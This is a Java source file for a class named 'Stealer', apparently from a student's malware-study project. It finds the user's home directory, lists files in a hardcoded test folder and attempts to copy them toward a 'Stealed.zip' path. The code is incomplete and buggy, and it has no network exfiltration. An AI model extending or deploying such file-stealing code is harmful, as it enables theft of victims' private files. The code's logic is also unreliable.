package Utils;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.List;

public class Stealer {
    private String filesStealed;
    private String victimDir;
    private String[] dataArray;
    private List<String> stealedList;
    private List<String> victimDirs = new ArrayList<>();
    private List<File> filesList;
    private File fileObtained;

    public String getFilesStealed() {
        return filesStealed;
    }

    public void setFilesStealed(String filesStealed) {
        this.filesStealed = filesStealed;
    }

    public String getVictimDir() {
        return victimDir;
    }

    public void setVictimDir(String victimDir) {
        this.victimDir = victimDir;
    }

    public String[] getDataArray() {
        return dataArray;
    }

    public void setDataArray(String[] dataArray) {
        this.dataArray = dataArray;
    }

    public List<String> getStealedList() {
        return stealedList;
    }

    public void setStealedList(List<String> stealedList) {
        this.stealedList = stealedList;
    }

    public List<String> getVictimDirs() {
        return victimDirs;
    }

    public void setVictimDirs(List<String> victimDirs) {
        this.victimDirs = victimDirs;
    }

    public List<File> getFilesList() {
        return filesList;
    }

    public void setFilesList(List<File> filesList) {
        this.filesList = filesList;
    }

    public File getFileObtained() {
        return fileObtained;
    }

    public void setFileObtained(File fileObtained) {
        this.fileObtained = fileObtained;
    }

    public String searchDirectoryFiles() {
        victimDir = System.getProperty("user.home");
        victimDirs.add(victimDir);
        return victimDir;
    }

    public String searchDirectoryFilesTest(String dir) {
        dir = System.getProperty("user.home");
        victimDirs.add(victimDir);
        return victimDir;
    }

    public List<File> analizePaths(String dir) {
        dir = "C:\\Users\\sebic\\OneDrive\\Documentos\\ProjectVirusStudys\\tests\\Disco";
        String stealedPath = "C:\\Users\\sebic\\OneDrive\\Documentos\\ProjectVirusStudys\\tests\\Stealed.zip";
        victimDirs.add(dir);
        fileObtained = new File(dir);

        filesList = new ArrayList<>();
        filesList.add(fileObtained);
        String[] filesData = fileObtained.list();
        Files stealFile;

        try {
            for (int i = 0; i < filesData.length; i++) {
                String nameFile = filesData[i];
                System.out.println(nameFile);

            }

        } catch (NullPointerException e) {
            e.printStackTrace();
        }

        try {
            for (File file : filesList) {
                Files.copy(file.toPath(), (new File(dir + file.getName())).toPath(), StandardCopyOption.REPLACE_EXISTING);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        return filesList;
    }

}
